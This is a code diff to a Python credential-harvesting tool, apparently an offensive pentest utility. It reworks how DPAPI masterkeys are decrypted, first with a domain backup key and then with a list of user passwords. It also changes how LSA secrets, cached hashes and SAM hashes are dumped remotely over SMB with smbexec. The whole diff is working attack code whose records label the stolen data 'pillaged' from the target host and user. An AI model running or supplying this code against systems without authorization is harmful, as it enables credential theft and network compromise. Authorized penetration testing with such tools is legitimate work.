@@ -1544,7 +1544,7 @@ class MySeatBelt:
                               pillaged_from_computer_ip=self.options.target_ip,
                               pillaged_from_username=user.username)
             self.logging.info(
-                f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [IE/EDGE Password] {bcolors.ENDC} for {vault_blob['Resource'].decode('utf-16le')} [ {bcolors.OKBLUE}{vault_blob['Username'].decode('utf-16le')} : {vault_blob['Password'].decode('utf-16le')}{bcolors.ENDC} ]")
+                f"[{self.options.target_ip}] [+]{bcolors.OKGREEN} [Internet Explorer] {bcolors.ENDC} for {vault_blob['Resource'].decode('utf-16le')} [ {bcolors.OKBLUE}{vault_blob['Username'].decode('utf-16le')} : {vault_blob['Password'].decode('utf-16le')}{bcolors.ENDC} ]")
             return retval
         except Exception as ex:
             self.logging.debug(
@@ -1972,97 +1972,100 @@ class MySeatBelt:
                     if 'DOMAIN' not in tested_type:
                         return self.decrypt_masterkey(user, guid, type='DOMAIN', tested_type=tested_type)
 
-            elif type == 'DOMAIN' and self.options.pvk is not None:
-                # For ADConnect
-                if user.is_adconnect is True and 'MACHINE-USER' not in tested_type:
-                    return self.decrypt_masterkey(user, guid, type='MACHINE-USER', tested_type=tested_type)
-                # Try de decrypt masterkey file
-                self.logging.debug(
-                    f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey {self.options.pvk}")
-                try:
-                    myoptions = copy.deepcopy(self.options)
-                    myoptions.file = localfile  # Masterkeyfile to parse
-                    myoptions.username = user.username
-                    myoptions.sid = user.sid
-                    mydpapi = DPAPI(myoptions, self.logging)
-                    decrypted_masterkey = mydpapi.decrypt_masterkey()
-                    if decrypted_masterkey != -1 and decrypted_masterkey != None:
-                        # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: %s" % decrypted_masterkey)
-                        user.masterkeys_file[guid]['status'] = 'decrypted'
-                        user.masterkeys_file[guid]['key'] = decrypted_masterkey
-                        # user.masterkeys[localfile] = decrypted_masterkey
-                        user.type = 'DOMAIN'
-                        user.type_validated = True
+            elif type == 'DOMAIN':
+                if self.options.pvk is not None:
+                    # For ADConnect
+                    if user.is_adconnect is True and 'MACHINE-USER' not in tested_type:
+                        return self.decrypt_masterkey(user, guid, type='MACHINE-USER', tested_type=tested_type)
+                    # Try de decrypt masterkey file
+                    self.logging.debug(
+                        f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey {self.options.pvk}")
+                    try:
+                        myoptions = copy.deepcopy(self.options)
+                        myoptions.file = localfile  # Masterkeyfile to parse
+                        myoptions.username = user.username
+                        myoptions.sid = user.sid
+                        mydpapi = DPAPI(myoptions, self.logging)
+                        decrypted_masterkey = mydpapi.decrypt_masterkey()
+                        if decrypted_masterkey != -1 and decrypted_masterkey != None:
+                            # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: %s" % decrypted_masterkey)
+                            user.masterkeys_file[guid]['status'] = 'decrypted'
+                            user.masterkeys_file[guid]['key'] = decrypted_masterkey
+                            # user.masterkeys[localfile] = decrypted_masterkey
+                            user.type = 'DOMAIN'
+                            user.type_validated = True
+                            self.logging.debug(
+                                f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for user {bcolors.OKBLUE} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
+                            self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
+                                                    status=user.masterkeys_file[guid]['status'],
+                                                    decrypted_with="DOMAIN-PVK",
+                                                    decrypted_value=decrypted_masterkey,
+                                                    pillaged_from_computer_ip=self.options.target_ip,
+                                                    pillaged_from_username=user.username)
+                            return user.masterkeys_file[guid]
+                        else:
+                            self.logging.debug(
+                                f"[{self.options.target_ip}] {bcolors.WARNING}Domain Backupkey {self.options.pvk} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING} Masterkey {guid} -> Checking with Local user with credz{bcolors.ENDC}")
+                            # if user.type_validated == False:
+                            tested_type.append('DOMAIN')
+                            return self.decrypt_masterkey(user, guid, 'LOCAL', tested_type=tested_type)
+                    except Exception as ex:
                         self.logging.debug(
-                            f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for user {bcolors.OKBLUE} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
-                        self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
-                                                 status=user.masterkeys_file[guid]['status'],
-                                                 decrypted_with="DOMAIN-PVK",
-                                                 decrypted_value=decrypted_masterkey,
-                                                 pillaged_from_computer_ip=self.options.target_ip,
-                                                 pillaged_from_username=user.username)
-                        return user.masterkeys_file[guid]
-                    else:
-                        self.logging.debug(
-                            f"[{self.options.target_ip}] {bcolors.WARNING}Domain Backupkey {self.options.pvk} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING} Masterkey {guid} -> Checking with Local user with credz{bcolors.ENDC}")
+                            f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey (most likely user is only local user) -> Running for Local user with credz{bcolors.ENDC}")
+                        self.logging.debug(f"exception was : {ex}")
                         # if user.type_validated == False:
                         tested_type.append('DOMAIN')
                         return self.decrypt_masterkey(user, guid, 'LOCAL', tested_type=tested_type)
-                except Exception as ex:
-                    self.logging.debug(
-                        f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey (most likely user is only local user) -> Running for Local user with credz{bcolors.ENDC}")
-                    self.logging.debug(f"exception was : {ex}")
-                    # if user.type_validated == False:
-                    tested_type.append('DOMAIN')
-                    return self.decrypt_masterkey(user, guid, 'LOCAL', tested_type=tested_type)
-            # type==LOCAL
-            # On a des credz
-            if len(self.options.credz) > 0 and user.masterkeys_file[guid][
-                'status'] != 'decrypted':  # localfile not in user.masterkeys:
-                self.logging.debug(
-                    f"[{self.options.target_ip}] [...] Testing decoding {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with credz")
-                for username in self.options.credz:
-                    if username.lower() in user.username.lower():  # pour fonctionner aussi avec le .domain ou les sessions multiple citrix en user.domain.001 ?
-                        # self.logging.debug(f"[{self.options.target_ip}] [...] Testing {len(self.options.credz[username])} credz for user {user.username}")
-                        # for test_cred in self.options.credz[user.username]:
-                        try:
-                            self.logging.debug(
-                                f"[{self.options.target_ip}]Trying to decrypt {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with user SID {user.sid} and {len(self.options.credz[username])}credential(s) from credz file")
-                            myoptions = copy.deepcopy(self.options)
-                            myoptions.file = localfile  # Masterkeyfile to parse
-                            # myoptions.password = self.options.credz[username]
-                            myoptions.sid = user.sid
-                            myoptions.pvk = None
-                            myoptions.key = None
-                            mydpapi = DPAPI(myoptions, self.logging)
-                            decrypted_masterkey = mydpapi.decrypt_masterkey(passwords=self.options.credz[username])
-                            if decrypted_masterkey != -1 and decrypted_masterkey != None:
-                                # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
-                                user.masterkeys_file[guid]['status'] = 'decrypted'
-                                user.masterkeys_file[guid]['key'] = decrypted_masterkey
-                                # user.masterkeys[localfile] = decrypted_masterkey
-                                user.type = 'LOCAL'
-                                user.type_validated = True
-                                self.logging.debug(
-                                    f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for User {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
-                                self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
-                                                         status=user.masterkeys_file[guid]['status'],
-                                                         decrypted_with=f"Password:{self.options.credz[username]}",
-                                                         decrypted_value=decrypted_masterkey,
-                                                         pillaged_from_computer_ip=self.options.target_ip,
-                                                         pillaged_from_username=user.username)
-                                return user.masterkeys_file[guid]
-                            else:
-                                self.logging.debug(
-                                    f"[{self.options.target_ip}] error decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey  {guid} with {len(self.options.credz[username])} passwords from user {username} in cred list")
-                        except Exception as ex:
-                            self.logging.debug(
-                                f"[{self.options.target_ip}] Except decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey with {len(self.options.credz[username])} passwords from user {username} in cred list")
-                            self.logging.debug(ex)
                 else:
+                    tested_type.append('DOMAIN')
+            elif 'LOCAL' not in tested_type:
+            # On a des credz
+                if len(self.options.credz) > 0 and user.masterkeys_file[guid][
+                    'status'] != 'decrypted':  # localfile not in user.masterkeys:
                     self.logging.debug(
-                        f"[{self.options.target_ip}] {bcolors.FAIL}no credential in credz file for user {user.username} and masterkey {guid} {bcolors.ENDC}")
-            tested_type.append('LOCAL')
+                        f"[{self.options.target_ip}] [...] Testing decoding {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with credz")
+                    for username in self.options.credz:
+                        if username.lower() in user.username.lower():  # pour fonctionner aussi avec le .domain ou les sessions multiple citrix en user.domain.001 ?
+                            # self.logging.debug(f"[{self.options.target_ip}] [...] Testing {len(self.options.credz[username])} credz for user {user.username}")
+                            # for test_cred in self.options.credz[user.username]:
+                            try:
+                                self.logging.debug(
+                                    f"[{self.options.target_ip}]Trying to decrypt {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with user SID {user.sid} and {len(self.options.credz[username])}credential(s) from credz file")
+                                myoptions = copy.deepcopy(self.options)
+                                myoptions.file = localfile  # Masterkeyfile to parse
+                                # myoptions.password = self.options.credz[username]
+                                myoptions.sid = user.sid
+                                myoptions.pvk = None
+                                myoptions.key = None
+                                mydpapi = DPAPI(myoptions, self.logging)
+                                decrypted_masterkey = mydpapi.decrypt_masterkey(passwords=self.options.credz[username])
+                                if decrypted_masterkey != -1 and decrypted_masterkey != None:
+                                    # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
+                                    user.masterkeys_file[guid]['status'] = 'decrypted'
+                                    user.masterkeys_file[guid]['key'] = decrypted_masterkey
+                                    # user.masterkeys[localfile] = decrypted_masterkey
+                                    user.type = 'LOCAL'
+                                    user.type_validated = True
+                                    self.logging.debug(
+                                        f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for User {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
+                                    self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
+                                                            status=user.masterkeys_file[guid]['status'],
+                                                            decrypted_with=f"Password:{self.options.credz[username]}",
+                                                            decrypted_value=decrypted_masterkey,
+                                                            pillaged_from_computer_ip=self.options.target_ip,
+                                                            pillaged_from_username=user.username)
+                                    return user.masterkeys_file[guid]
+                                else:
+                                    self.logging.debug(
+                                        f"[{self.options.target_ip}] error decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey  {guid} with {len(self.options.credz[username])} passwords from user {username} in cred list")
+                            except Exception as ex:
+                                self.logging.debug(
+                                    f"[{self.options.target_ip}] Except decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey with {len(self.options.credz[username])} passwords from user {username} in cred list")
+                                self.logging.debug(ex)
+                    else:
+                        self.logging.debug(
+                            f"[{self.options.target_ip}] {bcolors.FAIL}no credential in credz file for user {user.username} and masterkey {guid} {bcolors.ENDC}")
+                tested_type.append('LOCAL')
             if user.masterkeys_file[guid]['status'] == 'encrypted':
                 if 'DOMAIN' not in tested_type:
                     return self.decrypt_masterkey(user, guid, 'DOMAIN', tested_type=tested_type)
@@ -2086,10 +2089,11 @@ class MySeatBelt:
                 return user.masterkeys_file[guid]
 
     def test_remoteOps(self):
+        filedest = os.path.join(self.options.output_directory, self.options.target_ip)
         try:
             # Remove logging
             # logging.getLogger().setLevel(logging.CRITICAL)
-            self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE} [+] Dumping LSA Secrets{bcolors.ENDC}")
+            self.logging.info(f"[{self.options.target_ip}]{bcolors.OKBLUE} [+] Dumping LSA Secrets{bcolors.ENDC}")
 
             self.__remoteOps = MyRemoteOperations(self.smb, self.options.k, self.options.dc_ip)
             self.__remoteOps.setExecMethod('smbexec')
@@ -2097,6 +2101,7 @@ class MySeatBelt:
             self.__bootKey = self.__remoteOps.getBootKey()
             self.logging.debug(f"bootkey: {self.__bootKey}")
             SECURITYFileName = self.__remoteOps.saveSECURITY()
+            SECURITYFileName._RemoteFile__fileName = ntpath.join("Windows",SECURITYFileName._RemoteFile__fileName) 
             self.logging.debug("savesecurity")
             self.__LSASecrets = MyLSASecrets(SECURITYFileName, self.__bootKey, self.__remoteOps, isRemote=True,
                                              history=True)
@@ -2105,12 +2110,12 @@ class MySeatBelt:
             self.logging.debug("dump cached hashes")
             self.__LSASecrets.dumpSecrets()
 
-            filedest = os.path.join(os.path.join(self.options.output_directory, self.options.target_ip), 'LSA')
-            Path(os.path.split(filedest.replace('\\', '/'))[0]).mkdir(parents=True, exist_ok=True)
-            self.logging.debug(f"[{self.options.target_ip}] Dumping LSA Secrets to file {filedest}")
-            finalfile = self.__LSASecrets.exportSecrets(filedest)
+            filedest_lsa = os.path.join(filedest, 'LSA')
+            Path(os.path.split(filedest_lsa.replace('\\', '/'))[0]).mkdir(parents=True, exist_ok=True)
+            self.logging.debug(f"[{self.options.target_ip}] Dumping LSA Secrets to file {filedest_lsa}")
+            finalfile = self.__LSASecrets.exportSecrets(filedest_lsa)
             self.logging.debug("ret file %s" % finalfile)
-            self.__LSASecrets.exportCached(filedest)
+            self.__LSASecrets.exportCached(filedest_lsa)
         # Analyser les hash DCC2 pour un export massif.
         except Exception as ex:
             self.logging.debug(
@@ -2195,14 +2200,15 @@ class MySeatBelt:
 
         try:
             # Add SAM
-            self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE} [+] Dumping SAM Secrets{bcolors.ENDC}")
+            self.logging.info(f"[{self.options.target_ip}]{bcolors.OKBLUE} [+] Dumping SAM Secrets{bcolors.ENDC}")
             SAMFileName = self.__remoteOps.saveSAM()
+            SAMFileName._RemoteFile__fileName = ntpath.join("Windows",SAMFileName._RemoteFile__fileName) 
             self.__SAMHashes = MySAMHashes(SAMFileName, self.__bootKey, isRemote=True)
             self.__SAMHashes.dump()
-            filedest = os.path.join(os.path.join(self.options.output_directory, self.options.target_ip), 'SAM')
-            self.__SAMHashes.export(filedest)
+            filedest_sam = os.path.join(filedest, 'SAM')
+            self.__SAMHashes.export(filedest_sam)
             # Adding SAM hash to credz
-            tmp_filedest = filedest + '.sam'
+            tmp_filedest = filedest_sam + '.sam'
             f = open(tmp_filedest, 'rb')
             sam_data = f.read().split(b'\n')
             f.close()
@@ -2227,7 +2233,7 @@ class MySeatBelt:
                                           pillaged_from_computer_ip=self.options.target_ip,
                                           pillaged_from_username='MACHINE$')
             self.logging.info(
-                f"[{self.options.target_ip}] [+] {bcolors.OKBLUE} SAM : Collected {bcolors.OKGREEN}{len(sam_data)} hashes {bcolors.ENDC}")
+                f"[{self.options.target_ip}] [+]{bcolors.OKBLUE} SAM : Collected {bcolors.OKGREEN}{len(sam_data)} hashes {bcolors.ENDC}")
         # logging.getLogger().setLevel(logging.DEBUG)
         except Exception as ex:
             self.logging.debug(
